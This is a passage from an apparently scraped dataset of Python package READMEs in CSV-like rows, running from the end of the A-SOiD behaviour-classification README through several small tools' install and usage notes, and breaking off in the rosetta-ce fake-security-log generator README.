In general, users are required to provide a small labeled data set (ground truth) with behavioral categories of
their choice using one of the many available labeling tools (e.g. [BORIS](https://www.boris.unito.it/)7 ) or
import their previous supervised machine learning data sets. Following the upload of data
(see Fig. above, a), a A-SOiD project is created, including several parameters that further enable
users to select individual animals (in social data) and exclude body parts from the feature extraction.


Based on the configuration, the feature extraction (see Fig. below, b top) can be further customized
by defining a ""bout length"" referring to the temporal resolution in which single motifs are expected to appear
(e.g. the shortest duration a definable component of the designated behavior is expected to last).
The extracted features are then used in combination with the labeled ground truth to train a baseline model.
Here, an initial evaluation will give users insight into the performance on their base data set (see Fig. above, b bottom).
Note, that different splits are used to allow for a more thorough analysis (see Publication Methods for further details).


The baseline classification will then be used as a basis for the first active learning iteration,
where users are prompted by the app to view and refine bouts that were classified with low confidence
by the baseline model (see Fig. above,c left). Bouts are visualized by showing an animated sequence
of the provided pose information and designated body parts and the viewer can be utilized to show the bouts
in several options, including increased/decreased speed, reverse view and frame-by-frame view.
After submission of a refined bout, a new bout is shown at its place and the refinement continues for
a user-defined amount of low confidence bouts. Following refinement, a new iteration of the model is trained
and its performance can be viewed (see Fig. above,c right) in comparison to previous iterations.
This process is then repeated until the user is satisfied with the model's performance or until a plateau
has been reached (see publication).
\newline

Finally, users can upload and classify new data using the app and the previously trained classifier
(see Fig. above,d). To gain further insight into the results of the classification,
the app offers a reporting tab that allows users to view results (see Fig. above,d).

## Input:

A-SOiD supports the following input types:

### Pose estimation:
- [SLEAP](https://sleap.ai/)
- [DeepLabCut](http://www.mackenziemathislab.org/deeplabcut)

### Annotation files:
- [BORIS](https://www.boris.unito.it/) -> exported as binary files in 0.1 sec time steps (10 Hz): [Read the docs](https://boris.readthedocs.io/en/latest/#export-events-as-behavioral-binary-table)
- any annotation files in this style ([one-hot encoded](https://en.wikipedia.org/wiki/One-hot)), including an index that specifies time steps in seconds.
----
> You can see an example of this using pandas in our docs: [Convert annotations to binary format](docs/export_annotations_to_binary_format.ipynb)
---

## System Requirements
### Hardware requirements
A-SOiD requires only a standard computer with enough RAM to support the model training during active learning. For clustering, CPU and RAM requirements are increased. Refer to [B-SOiD](https://github.com/YttriLab/B-SOID) or our paper for details. 

### Software requirements
#### OS Requirements
This package is supported for *Windows* but can be run on *Linux* computers given additional installation of require packages.

#### Python Dependencies
For dependencies please refer to the requirements.txt file. No additional requirements.

## Installation

There are two ways to install A-SOiD. Installation will only take a couple of minutes. We recommend using a fresh environment in any case to avoid any installation conflicts.
To simplify the process, we provide `asoid.yml` file that will do everything for you (see below).

### Download repository and install locally as python package within a new environment

Clone this repository and create a new environment in which A-SOiD will be installed automatically (recommended) [Anaconda/Python3](https://www.anaconda.com/).

#### Change your current working directory to the location where you want the directory to be made.
````
cd path/to/A-SOiD
````
Clone it directly from GitHub
```bash
git clone https://github.com/YttriLab/A-SOID.git
```
or download ZIP and unpack where you want. 

#### Create an environment using anaconda:
````
conda env create --file asoid.yml
````

#### Alternatively, you can install A-SOiD locally 
in the directory you saved the repo in:
````
cd path/to/A-SOiD
````
activate the environment, you want to install A-SOiD in:
````
conda activate MYENVIRONMENT
````
install using `setup.py` in your own environment:
````
pip install .
````

A-SOiD is installed alongside all dependencies.

## Updating A-SOiD

1. Download or clone the latest version of A-SOiD from this repository.

2. Activate the environment you installed A-SOiD in.
````
conda activate asoid
````
3. Go to the locotion of that you unpacked the latest version at.
````
cd path/to/A-SOiD
````
4. Install the new version on-top of the other using `setup.py`:
````
pip install .
````
The console output should look like this:

    Successfully built asoid
    Installing collected packages: asoid
      Attempting uninstall: asoid
        Found existing installation: asoid 0.1
        Uninstalling asoid-0.1:
          Successfully uninstalled asoid-0.1
    Successfully installed asoid-0.2.0

You can start A-SOiD again and use the new version just like before.

## How to start A-SOiD:

````
conda activate asoid
````

You can run A-SOiD now from inside your environment by using (you do not have change directories anymore):
````
asoid app
````
## Demo:

We invite you to test A-SOiD using the [CalMS21](https://data.caltech.edu/records/s0vdx-0k302) data set. The data set can be used within the app by simply specifying the path to the train and test set files (see below). While you can reproduce our figures using the provided notebooks, the data set also allows an easy first use case to get familiar with all significant steps in A-SOiD.

1. Download the data set and convert it into npy format using their provided script.
2. Run A-SOiD and select 'CalMS21 (paper)' in the `Upload Data` tab.
3. Enter the full path to both train and test files from the first challenge (e.g. 'C:\Dataset\task1_classic_classification\calms21_task1_train.npy' and 'C:\Dataset\task1_classic_classification\calms21_task1_test.npy').
4. Enter a directory and prefix to create the A-SOiD project in.
5. Click on 'Preprocess' and follow the remaining workflow of the app. After successful importing the data set, you can now run the CalMS21 project as any other project in A-SOiD. 

The overall runtime depends on your setup and parameters set during training, but should be completed within 1h of starting the project.
Tested on: AMD Ryzen 9 6900HX 3.30 GHz and 16 GB RAM; Windows 11 Home


---
## Contributors:

A-SOiD was developed as a collaboration between the Yttri Lab and Schwarz Lab by:

[Jens Schweihoff](https://github.com/JensBlack), University Bonn

[Alex Hsu](https://github.com/runninghsus), Carnegie Mellon University

[Martin Schwarz](https://github.com/SchwarzNeuroconLab), University Bonn

[Eric Yttri](https://github.com/YttriLab), Carnegie Mellon University

---
## Get in contact:

### Corresponding authors:

Martin K. Schwarz [SchwarzLab](https://ieecr-bonn.de/ieecr-groups/schwarz-group/)

Eric A. Yttri [YttriLab](https://labs.bio.cmu.edu/yttri/)

### Contributing

For recommended changes that you would like to see, open an issue. 

There are many exciting avenues to explore based on this work. 
Please do not hesitate to contact us for collaborations.

### Issues running A-SOiD
If you are having issues, please refer to our issue page first, to see whether a similar issue was already solved.
If this does not apply to your problem, please submit an issue with enough information that we can replicate it. Thank you!

## License
A-SOiD is released under a [Clear BSD License](https://github.com/YttriLab/A-SOID/blob/main/LICENSE) and is intended for research/academic use only.

---

## References
If you are using our work, please make sure to cite us and any additional resources you were using

1. [Mathis A, Mamidanna P, Cury KM, Abe T, Murthy VN, Mathis MW, Bethge M. DeepLabCut: markerless pose estimation of user-defined body parts with deep learning. Nat Neurosci. 2018 Sep;21(9):1281-1289. doi: 10.1038/s41593-018-0209-y. Epub 2018 Aug 20. PubMed PMID: 30127430.](https://www.nature.com/articles/s41593-018-0209-y)

2. [Nath T, Mathis A, Chen AC, Patel A, Bethge M, Mathis MW. Using DeepLabCut for 3D markerless pose estimation across species and behaviors. Nat Protoc. 2019 Jul;14(7):2152-2176. doi: 10.1038/s41596-019-0176-0. Epub 2019 Jun 21. PubMed PMID: 31227823.](https://doi.org/10.1038/s41596-019-0176-0)

3. [Insafutdinov E., Pishchulin L., Andres B., Andriluka M., Schiele B. (2016) DeeperCut: A Deeper, Stronger, and Faster Multi-person Pose Estimation Model. In: Leibe B., Matas J., Sebe N., Welling M. (eds) Computer Vision â€“ ECCV 2016. ECCV 2016. Lecture Notes in Computer Science, vol 9910. Springer, Cham](http://arxiv.org/abs/1605.03170)

4. [Pereira, T.D., Tabris, N., Matsliah, A. et al. SLEAP: A deep learning system for multi-animal pose tracking. Nat Methods 19, 486â€“495 (2022).](https://doi.org/10.1038/s41592-022-01426-1)

5. [Cao Z, Hidalgo Martinez G, Simon T, Wei SE, Sheikh YA. OpenPose: Realtime Multi-Person 2D Pose Estimation using Part Affinity Fields. IEEE Trans Pattern Anal Mach Intell. 2019 Jul 17. Epub ahead of print. PMID: 31331883.](https://doi.org/10.1109/TPAMI.2019.2929257).
6. [Hsu AI, Yttri EA. B-SOiD, an open-source unsupervised algorithm for identification and fast prediction of behaviors. Nat Commun. 2021 Aug 31;12(1):5188](https://doi.org/10.1038/s41467-021-25420-x)
7. [Friard, O. and Gamba, M. (2016), BORIS: a free, versatile open-source event-logging software for video/audio coding and live observations.  Methods Ecol Evol, 7: 1325-1330](https://doi.org/10.1111/2041-210X.12584)

### How to cite us:
    A-SOiD, an active learning platform for expert-guided, data efficient discovery of behavior.
    Jens F. Schweihoff, Alexander I. Hsu, Martin K. Schwarz, Eric A. Yttri
    bioRxiv 2022.11.04.515138; doi: https://doi.org/10.1101/2022.11.04.515138

or see [Cite Us](CITATION)



",yttrilab/a-soid
stagekit,https://github.com/icui/stagekit,6,0,0,,,icui/stagekit
findsystemfontsfilename,https://github.com/moi15moi/FindSystemFontsFilename/,1,1092,1092,"# FindSystemFontsFilename
This tool allows you to get the font filename on your system. It will collect TrueType (.ttf), OpenType (.otf) and TrueType Collection (.ttf) font format.

It uses some APIs to find the font filename:
- Windows: [DirectWrite API](https://learn.microsoft.com/en-us/windows/win32/directwrite/direct-write-portal)
- macOS: [Core Text API](https://developer.apple.com/documentation/coretext)
- Linux: [Fontconfig API](https://www.freedesktop.org/wiki/Software/fontconfig/)

## Installation
```
pip install FindSystemFontsFilename
```

## How to use it
```python
from find_system_fonts_filename import get_system_fonts_filename, FontConfigNotFound, OSNotSupported

try:
    fonts_filename = get_system_fonts_filename()
except (FontConfigNotFound, OSNotSupported):
    # Deal with the exception
    # OSNotSupported can only happen in Windows and macOS
    #   - Windows Vista SP2 and more are supported
    #   - macOS 10.6 and more are supported
    # FontConfigNotFound can only happen on Linux when Fontconfig could't be found.
    pass
```
","# FindSystemFontsFilename
This tool allows you to get the font filename on your system. It will collect TrueType (.ttf), OpenType (.otf) and TrueType Collection (.ttf) font format.

It uses some APIs to find the font filename:
- Windows: [DirectWrite API](https://learn.microsoft.com/en-us/windows/win32/directwrite/direct-write-portal)
- macOS: [Core Text API](https://developer.apple.com/documentation/coretext)
- Linux: [Fontconfig API](https://www.freedesktop.org/wiki/Software/fontconfig/)

## Installation
```
pip install FindSystemFontsFilename
```

## How to use it
```python
from find_system_fonts_filename import get_system_fonts_filename, FontConfigNotFound, OSNotSupported

try:
    fonts_filename = get_system_fonts_filename()
except (FontConfigNotFound, OSNotSupported):
    # Deal with the exception
    # OSNotSupported can only happen in Windows and macOS
    #   - Windows Vista SP2 and more are supported
    #   - macOS 10.6 and more are supported
    # FontConfigNotFound can only happen on Linux when Fontconfig could't be found.
    pass
```
",moi15moi/findsystemfontsfilename
cloudflare-images,https://github.com/justmars/cloudflare-images,4,265,265,"# cloudflare-images

![Github CI](https://github.com/justmars/cloudflare-images/actions/workflows/main.yml/badge.svg)

## Development

See [documentation](https://justmars.github.io/cloudflare-images).

1. Run `poetry install`
2. Run `poetry shell`
3. Run `pytest`
","# cloudflare-images

![Github CI](https://github.com/justmars/cloudflare-images/actions/workflows/main.yml/badge.svg)

## Development

See [documentation](https://justmars.github.io/cloudflare-images).

1. Run `poetry install`
2. Run `poetry shell`
3. Run `pytest`
",justmars/cloudflare-images
lidar-visualizer,https://github.com/PRBonn/lidar-visualizer,1,1226,1226,"# LiDAR Visualizer 🚀

A flexible, easy-to-use, LiDAR (or any point cloud) visualizer for Linux, Windows, and macOS.

![out](https://user-images.githubusercontent.com/21349875/234777083-eeb4ec57-cb50-4c69-babd-4cc8e63cff86.png)

If you also need to obtain poses from your dataset, consider checking out [KISS-ICP](https://github.com/PRBonn/kiss-icp).

## Install

```sh
pip install lidar-visualizer
```

Next, follow the instructions on how to run the system by typing:

```sh
lidar_visualizer --help
```

## Citation

If you use this visualizer for any academic work, please cite our original [paper](https://www.ipb.uni-bonn.de/wp-content/papercite-data/pdf/vizzo2023ral.pdf).

```bibtex
@article{vizzo2023ral,
  author    = {Vizzo, Ignacio and Guadagnino, Tiziano and Mersch, Benedikt and Wiesmann, Louis and Behley, Jens and Stachniss, Cyrill},
  title     = {{KISS-ICP: In Defense of Point-to-Point ICP -- Simple, Accurate, and Robust Registration If Done the Right Way}},
  journal   = {IEEE Robotics and Automation Letters (RA-L)},
  pages     = {1029--1036},
  doi       = {10.1109/LRA.2023.3236571},
  volume    = {8},
  number    = {2},
  year      = {2023},
  codeurl   = {https://github.com/PRBonn/kiss-icp},
}
```
","# LiDAR Visualizer 🚀

A flexible, easy-to-use, LiDAR (or any point cloud) visualizer for Linux, Windows, and macOS.

![out](https://user-images.githubusercontent.com/21349875/234777083-eeb4ec57-cb50-4c69-babd-4cc8e63cff86.png)

If you also need to obtain poses from your dataset, consider checking out [KISS-ICP](https://github.com/PRBonn/kiss-icp).

## Install

```sh
pip install lidar-visualizer
```

Next, follow the instructions on how to run the system by typing:

```sh
lidar_visualizer --help
```

## Citation

If you use this visualizer for any academic work, please cite our original [paper](https://www.ipb.uni-bonn.de/wp-content/papercite-data/pdf/vizzo2023ral.pdf).

```bibtex
@article{vizzo2023ral,
  author    = {Vizzo, Ignacio and Guadagnino, Tiziano and Mersch, Benedikt and Wiesmann, Louis and Behley, Jens and Stachniss, Cyrill},
  title     = {{KISS-ICP: In Defense of Point-to-Point ICP -- Simple, Accurate, and Robust Registration If Done the Right Way}},
  journal   = {IEEE Robotics and Automation Letters (RA-L)},
  pages     = {1029--1036},
  doi       = {10.1109/LRA.2023.3236571},
  volume    = {8},
  number    = {2},
  year      = {2023},
  codeurl   = {https://github.com/PRBonn/kiss-icp},
}
```
",prbonn/lidar-visualizer
vallocal,https://github.com/ValUtils/ValLocal,1,12,12,"# ValLocal
","# ValLocal
",valutils/vallocal
nodered-py,https://github.com/oyajiDev/NodeRED.py,7,1752,1081,"<h1 align=""center"">
    NodeRED.py
</h1>
<p align=""center"">
    make python function to Node-RED node
</p>
<br/>

<div align=""center"">
    <a href=""https://github.com/oyajiDev/HU4PY/blob/main/LICENSE"">
        <img src=""https://img.shields.io/github/license/oyajiDev/HU4PY.svg"" alt=""MIT License"" />
    </a>
    <a href=""https://pypi.org/project/nodered.py/"">
        <img src=""https://img.shields.io/pypi/v/nodered.py.svg"" alt=""pypi"" />
    </a>
</div>
<br/><br/>


## 🌐 install
### - using pip
```zsh
python -m pip install nodered.py
```

### - using git(dev)
```zsh
python -m pip install git+https://github.com/oyajiDev/NodeRED.py.git
```

<br/><br/>

## 🛠 usage
### server initialize
- default server
```python
from noderedpy import Server, RED

server = Server(
    RED(
        os.path.join(__dirname, "".node-red""),
        ""/node-red"", 1880
    )
)
```
- standalone(with webview)
```python
from noderedpy import StandaloneServer, RED

server = StandaloneServer(
    RED(
        os.path.join(__dirname, "".node-red""),
        ""/node-red"", 1880
    )
)
```
<br/>

### register Node
```python
@register(""test"")
def test(props:dict, msg:dict) -> dict:
    # user codes here
    return msg
```
- See <a href=""https://github.com/oyajiDev/NodeRED.py/blob/08b2295ab537be97ad9e9a2f94154cdcb36685d0/noderedpy/decorator.py#L8"">noredpy.decorator.register function</a> for details
- See <a href=""https://github.com/oyajiDev/NodeRED.py/blob/08b2295ab537be97ad9e9a2f94154cdcb36685d0/noderedpy/_property.py"">noderedpy._property</a> for details of ""Property""
<br/>

### start server
- default server
```python
server.start(""{port}"")
```
- standalone(with webview)
```python
server.start(""{title}"")
```
<br/><br/>

## Todos
[x] type support for ""list"" and ""dict""
","
    NodeRED.py


    make python function to Node-RED node













## 🌐 install
### - using pip
```zsh
python -m pip install nodered.py
```

### - using git(dev)
```zsh
python -m pip install git+https://github.com/oyajiDev/NodeRED.py.git
```



## 🛠 usage
### server initialize
- default server
```python
from noderedpy import Server, RED

server = Server(
    RED(
        os.path.join(__dirname, "".node-red""),
        ""/node-red"", 1880
    )
)
```
- standalone(with webview)
```python
from noderedpy import StandaloneServer, RED

server = StandaloneServer(
    RED(
        os.path.join(__dirname, "".node-red""),
        ""/node-red"", 1880
    )
)
```


### register Node
```python
@register(""test"")
def test(props:dict, msg:dict) -> dict:
    # user codes here
    return msg
```
- See noredpy.decorator.register function for details
- See noderedpy._property for details of ""Property""


### start server
- default server
```python
server.start(""{port}"")
```
- standalone(with webview)
```python
server.start(""{title}"")
```


## Todos
[x] type support for ""list"" and ""dict""
",oyajidev/nodered.py
grappy-lfjv,https://github.com/pypa/sampleproject,1,0,0,,,pypa/sampleproject
quizpython,https://github.com/TheGallium/quizpython,0,0,0,,,thegallium/quizpython
pyobigram,https://github.com/ObisoftDev/pyobigram,6,0,0,,,obisoftdev/pyobigram
print-pretty-tree,https://github.com/itsbrex/print-pretty-tree,0,3292,2714,"# Print Pretty Tree

a.k.a. `ptree` is a simple Python script that displays the directory tree of the current working directory with color-coded output for easy file identification.

<p align=""center"">
  <img width=""460""  src=""https://i.imgur.com/GSO6vmJ.jpg"">
</p>

## Installation

To install `print-pretty-tree`, you can use either `pip` or other package managers like `npm`, `pnpm`, or `yarn`.

### Install using pip

If you have Python and `pip` installed:

```bash
pip install print-pretty-tree --user
```

### Install using other package managers

If you have `npm` 5.2 or higher, we recommend using `npx` to run packages globally. This way, you don't need to install the package globally and can still use it as a tool.

```bash
npx print-pretty-tree
```

If you still want to install `print-pretty-tree` globally, on the command line, run the following command:

```bash
npm install -g print-pretty-tree
```

If you get an EACCES permissions error, you may need to reinstall `npm` with a version manager or manually change `npm`'s default directory. For more information, see the [npm docs here](https://docs.npmjs.com/resolving-eacces-permissions-errors-when-installing-packages-globally).

## Usage

Once you have installed `print-pretty-tree`, you can run the script in any directory.
> You can run any of the commands below in any directory, regardless of how you installed it.
```bash
pt

ptree

print-pretty-tree
```

The script excludes certain files and folders like node_modules and .git by default to make the output easier to manage. It will recursively display the directory structure in a visually pleasing way.



## Customization

- To add more file types and colors to the output, you can modify the `FILE_TYPE_COLORS` dictionary in the script.
- You can also customize the excluded file patterns by modifying the `EXCLUDED_PATTERNS` list in the script.

## Contributing

If you find any bugs or want to suggest new features, please feel free to contribute by submitting an [issue](https://github.com/itsbrex/print-pretty-tree/issues) or a [pull request](https://github.com/itsbrex/print-pretty-tree/pulls).

## Contributors ✨
Thanks goes to these wonderful people ([emoji key](https://github.com/all-contributors/all-contributors#emoji-key)):

<!-- ALL-CONTRIBUTORS-BADGE:START - Do not remove or modify this section -->
[![All Contributors](https://img.shields.io/github/all-contributors/itsbrex/print-pretty-tree?color=ee8449&style=flat-square)](#Contributing)

<!-- ALL-CONTRIBUTORS-BADGE:END -->

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->
This project follows the [all-contributors](https://allcontributors.org/) specification. Contributions of any kind welcome!

## License

Licensed under the MIT license. See the [LICENSE](./LICENSE) file for more information.

If you found this project interesting or helpful, please consider [sponsoring me](https://github.com/sponsors/itsbrex) or <a href=""https://twitter.com/itsbrex"">following me on twitter <img src=""https://storage.googleapis.com/saasify-assets/twitter-logo.svg"" alt=""twitter"" height=""24px"" align=""center""></a>
","# Print Pretty Tree

a.k.a. `ptree` is a simple Python script that displays the directory tree of the current working directory with color-coded output for easy file identification.





## Installation

To install `print-pretty-tree`, you can use either `pip` or other package managers like `npm`, `pnpm`, or `yarn`.

### Install using pip

If you have Python and `pip` installed:

```bash
pip install print-pretty-tree --user
```

### Install using other package managers

If you have `npm` 5.2 or higher, we recommend using `npx` to run packages globally. This way, you don't need to install the package globally and can still use it as a tool.

```bash
npx print-pretty-tree
```

If you still want to install `print-pretty-tree` globally, on the command line, run the following command:

```bash
npm install -g print-pretty-tree
```

If you get an EACCES permissions error, you may need to reinstall `npm` with a version manager or manually change `npm`'s default directory. For more information, see the [npm docs here](https://docs.npmjs.com/resolving-eacces-permissions-errors-when-installing-packages-globally).

## Usage

Once you have installed `print-pretty-tree`, you can run the script in any directory.
> You can run any of the commands below in any directory, regardless of how you installed it.
```bash
pt

ptree

print-pretty-tree
```

The script excludes certain files and folders like node_modules and .git by default to make the output easier to manage. It will recursively display the directory structure in a visually pleasing way.



## Customization

- To add more file types and colors to the output, you can modify the `FILE_TYPE_COLORS` dictionary in the script.
- You can also customize the excluded file patterns by modifying the `EXCLUDED_PATTERNS` list in the script.

## Contributing

If you find any bugs or want to suggest new features, please feel free to contribute by submitting an [issue](https://github.com/itsbrex/print-pretty-tree/issues) or a [pull request](https://github.com/itsbrex/print-pretty-tree/pulls).

## Contributors ✨
Thanks goes to these wonderful people ([emoji key](https://github.com/all-contributors/all-contributors#emoji-key)):


[![All Contributors](https://img.shields.io/github/all-contributors/itsbrex/print-pretty-tree?color=ee8449&style=flat-square)](#Contributing)








This project follows the [all-contributors](https://allcontributors.org/) specification. Contributions of any kind welcome!

## License

Licensed under the MIT license. See the [LICENSE](./LICENSE) file for more information.

If you found this project interesting or helpful, please consider [sponsoring me](https://github.com/sponsors/itsbrex) or following me on twitter 
",itsbrex/print-pretty-tree
uniswapsim,https://github.com/pypa/sampleproject,0,13,13,"# UniswapSim
","# UniswapSim
",pypa/sampleproject
fsaccone,https://github.com/fsaccone/cli,1,569,180,"# CLI ([fsaccone](https://pypi.org/project/fsaccone/))
A CLI that creates opinionated project templates.

## Installation
> `pip install fsaccone`

## Usage
> `fsaccone --template <TEMPLATE>`

## Flags
- `--version` / `-v`                          - Prints the package version.

- `--template` / `-t` `<TEMPLATE>`            - The name of the template to utilize.
- `--directory` / `-dir` / `-d` `<DIRECTORY>` - The directory to build the template in.
- `-y`                                        - Skips the confirmation alert.

## License
[MIT License](LICENSE.txt)
","# CLI ([fsaccone](https://pypi.org/project/fsaccone/))
A CLI that creates opinionated project templates.

## Installation
> `pip install fsaccone`

## Usage
> `fsaccone --template ",fsaccone/cli
daisy-llm,https://github.com/myrakrusemark/daisy_llm,32,3250,3250,"## 🌼 Daisy LLM Tools 🌼
Daisy is a Python platform designed to work with language model APIs such as OpenAI's GPT-3 and GPT-4. It includes a suite of classes and methods that can be used to converse with, extend capabilities, and augment the reasoning capacities of large language models.

### 🏁 Getting Started
Install package
```
pip install daisy_llm
```

Import into your project and use. See main-example.py


Create ```config.py``` in your project with necessary information and enable desired modules to be loaded. See [Daisy-openai-chat](https://github.com/myrakrusemark/Daisy-openAI-chat) for sample project and a collection of modules to get started

### 🧰 Capabilities
Daisy accepts different types of user-developed ""modules"". A voice assistant module comes with [Daisy-openai-chat](https://github.com/myrakrusemark/Daisy-openAI-chat) as a ""proof-of-concept"". Possible configurations and apps built using Daisy could include:
  - Web apps
  - Conversational processing APIs
  - Computer vision interpretation
  - Autonomous initiation (with time awareness, Daisy could send a message or tool-form without user input)
  - Customer service IVR (which could be powerful with API tool-forms on the back-end).
  - Possibilities are endless, you only need to create what you want to see in the world. This platform makes that easier.

Keep in mind: Daisy is still in development. It has, and will, evolve significantly in the coming months as contributors enhance functinality by improving platform code, ading module hooks, and developing their own modules.


### 🛎️ Services
Daisy uses the following APIs for conversation processing:
  - Language model: OpenAI chatGPT
  - Speech-to-text (STT): AssemblyAI
  - Text-To-Speech(TTS): ElevenLabs (Quality), Google Cloud TTS (Cheap), Google Translate TTS (Free!) (Modules in [Daisy-openai-chat](https://github.com/myrakrusemark/Daisy-openAI-chat). Uses pyttsx3 by default)
  - Wake word (Local): Picovice Porcupine
  - Alternative local APIs are available and should be easily interchangeable if you choose to use them. In some cases, they can be switched out as modules. In every other case, a code hook can be added to make it interchangeable.


### 🌇 Background
I have been eager to have a conversation with chatGPT using my voice. I used to search daily for a program that could exchange between speech recognition and TTS for a real human-like conversation, but it was not until recently that I discovered one.

So of course I began making what I wanted in the world. I started working on a voice recognition script for chatGPT. It began with simple requests, such as incorporating a request to openAI API and routing the speech recognition output. Since then the project evolved into a platform for building applications, opening the door for infinite potential.

Some people argue that text models and AI are not thinking, but just using heuristics. However, when we examine ourselves, we too are simply a collection of learned behavior and responses. Although GPT may not be perfect, it is important to reflect on ourselves and determine how much better we truly are.

### 🤝 Compatibility
This software is designed to run on Windows and Linux.


### ✅ To-Do
- LLMs (API or local) as modules","## 🌼 Daisy LLM Tools 🌼
Daisy is a Python platform designed to work with language model APIs such as OpenAI's GPT-3 and GPT-4. It includes a suite of classes and methods that can be used to converse with, extend capabilities, and augment the reasoning capacities of large language models.

### 🏁 Getting Started
Install package
```
pip install daisy_llm
```

Import into your project and use. See main-example.py


Create ```config.py``` in your project with necessary information and enable desired modules to be loaded. See [Daisy-openai-chat](https://github.com/myrakrusemark/Daisy-openAI-chat) for sample project and a collection of modules to get started

### 🧰 Capabilities
Daisy accepts different types of user-developed ""modules"". A voice assistant module comes with [Daisy-openai-chat](https://github.com/myrakrusemark/Daisy-openAI-chat) as a ""proof-of-concept"". Possible configurations and apps built using Daisy could include:
  - Web apps
  - Conversational processing APIs
  - Computer vision interpretation
  - Autonomous initiation (with time awareness, Daisy could send a message or tool-form without user input)
  - Customer service IVR (which could be powerful with API tool-forms on the back-end).
  - Possibilities are endless, you only need to create what you want to see in the world. This platform makes that easier.

Keep in mind: Daisy is still in development. It has, and will, evolve significantly in the coming months as contributors enhance functinality by improving platform code, ading module hooks, and developing their own modules.


### 🛎️ Services
Daisy uses the following APIs for conversation processing:
  - Language model: OpenAI chatGPT
  - Speech-to-text (STT): AssemblyAI
  - Text-To-Speech(TTS): ElevenLabs (Quality), Google Cloud TTS (Cheap), Google Translate TTS (Free!) (Modules in [Daisy-openai-chat](https://github.com/myrakrusemark/Daisy-openAI-chat). Uses pyttsx3 by default)
  - Wake word (Local): Picovice Porcupine
  - Alternative local APIs are available and should be easily interchangeable if you choose to use them. In some cases, they can be switched out as modules. In every other case, a code hook can be added to make it interchangeable.


### 🌇 Background
I have been eager to have a conversation with chatGPT using my voice. I used to search daily for a program that could exchange between speech recognition and TTS for a real human-like conversation, but it was not until recently that I discovered one.

So of course I began making what I wanted in the world. I started working on a voice recognition script for chatGPT. It began with simple requests, such as incorporating a request to openAI API and routing the speech recognition output. Since then the project evolved into a platform for building applications, opening the door for infinite potential.

Some people argue that text models and AI are not thinking, but just using heuristics. However, when we examine ourselves, we too are simply a collection of learned behavior and responses. Although GPT may not be perfect, it is important to reflect on ourselves and determine how much better we truly are.

### 🤝 Compatibility
This software is designed to run on Windows and Linux.


### ✅ To-Do
- LLMs (API or local) as modules",myrakrusemark/daisy_llm
sortinghat-openinfra,https://github.com/bitergia-analytics/sortinghat-openinfra,2,2244,2244,"# sortinghat-openinfra

SortingHat backend to import identities from OpenInfraID

## Requirements

 * Python >= 3.7

You will also need some other libraries for running the tool, you can find the
whole list of dependencies in [pyproject.toml](pyproject.toml) file.

## Installation

There are several ways to install sortinghat-openinfra on your system: packages or source 
code using Poetry or pip.

### PyPI

sortinghat-openinfra can be installed using pip, a tool for installing Python packages. 
To do it, run the next command:
```
$ pip install sortinghat-openinfra
```

### Source code

To install from the source code you will need to clone the repository first:
```
$ git clone https://github.com/bitergia-analytics/sortinghat-openinfra
$ cd sortinghat-openinfra
```

Then use pip or Poetry to install the package along with its dependencies.

#### Pip
To install the package from local directory run the following command:
```
$ pip install .
```
In case you are a developer, you should install sortinghat-openinfra in editable mode:
```
$ pip install -e .
```

## Usage

Install this SortingHat backend to import identities from OpenInfraID. You can
use this importer using the API or the UI. The name of the backend is 
`OpenInfraID`. You need to provide the URL in the importer configuration,
typically `https://openstackid-resources.openstack.org`.

By default, this backend only obtain members from the public API that doesn't
contain email information. If you want to obtain members emails you need
to define the following configuration variables in your settings file:
- `OPENINFRA_CLIENT_ID`: OpenInfraID Oauth2 client ID for private API.
- `OPENINFRA_CLIENT_SECRET`: OpenInfraID Oauth2 client secret for private API.

#### Poetry
We use [poetry](https://python-poetry.org/) for dependency management and 
packaging. You can install it following its [documentation](https://python-poetry.org/docs/#installation).
Once you have installed it, you can install sortinghat-openinfra and the dependencies in 
a project isolated environment using:
```
$ poetry install
```
To spaw a new shell within the virtual environment use:
```
$ poetry shell
```

## License

Licensed under GNU General Public License (GPL), version 3 or later.
","# sortinghat-openinfra

SortingHat backend to import identities from OpenInfraID

## Requirements

 * Python >= 3.7

You will also need some other libraries for running the tool, you can find the
whole list of dependencies in [pyproject.toml](pyproject.toml) file.

## Installation

There are several ways to install sortinghat-openinfra on your system: packages or source 
code using Poetry or pip.

### PyPI

sortinghat-openinfra can be installed using pip, a tool for installing Python packages. 
To do it, run the next command:
```
$ pip install sortinghat-openinfra
```

### Source code

To install from the source code you will need to clone the repository first:
```
$ git clone https://github.com/bitergia-analytics/sortinghat-openinfra
$ cd sortinghat-openinfra
```

Then use pip or Poetry to install the package along with its dependencies.

#### Pip
To install the package from local directory run the following command:
```
$ pip install .
```
In case you are a developer, you should install sortinghat-openinfra in editable mode:
```
$ pip install -e .
```

## Usage

Install this SortingHat backend to import identities from OpenInfraID. You can
use this importer using the API or the UI. The name of the backend is 
`OpenInfraID`. You need to provide the URL in the importer configuration,
typically `https://openstackid-resources.openstack.org`.

By default, this backend only obtain members from the public API that doesn't
contain email information. If you want to obtain members emails you need
to define the following configuration variables in your settings file:
- `OPENINFRA_CLIENT_ID`: OpenInfraID Oauth2 client ID for private API.
- `OPENINFRA_CLIENT_SECRET`: OpenInfraID Oauth2 client secret for private API.

#### Poetry
We use [poetry](https://python-poetry.org/) for dependency management and 
packaging. You can install it following its [documentation](https://python-poetry.org/docs/#installation).
Once you have installed it, you can install sortinghat-openinfra and the dependencies in 
a project isolated environment using:
```
$ poetry install
```
To spaw a new shell within the virtual environment use:
```
$ poetry shell
```

## License

Licensed under GNU General Public License (GPL), version 3 or later.
",bitergia-analytics/sortinghat-openinfra
rosetta-ce,https://github.com/ayman-m/rosetta,3,10750,9102,"[![snyk](https://snyk.io/test/github/ayman-m/rosetta/badge.svg)](https://snyk.io/test/github/my-soc/Rosetta)
![codeql](https://github.com/ayman-m/rosetta/actions/workflows/github-code-scanning/codeql/badge.svg)
[![slack-community](https://img.shields.io/badge/Slack-4A154C?logo=slack&logoColor=white)](https://go-rosetta.slack.com)

# Rosetta

Rosetta is a Python package that can be used to fake security logs and alerts for testing different detection and response use cases. It provides the following functions:
- Generate bad and random observables/indicators that include IP Addresses, Urls, File hashes , CVE's and more
- Fake log messages in different formats like CEF, LEEF and JSON.
- Convert one log format into another, for example from CEF to LEEF.
- Send the fake log message to different log management and analytics tools.

## Installation

- You can install rosetta via pip:
```sh
pip install rosetta-ce
```
- Or you can install it from the source code:
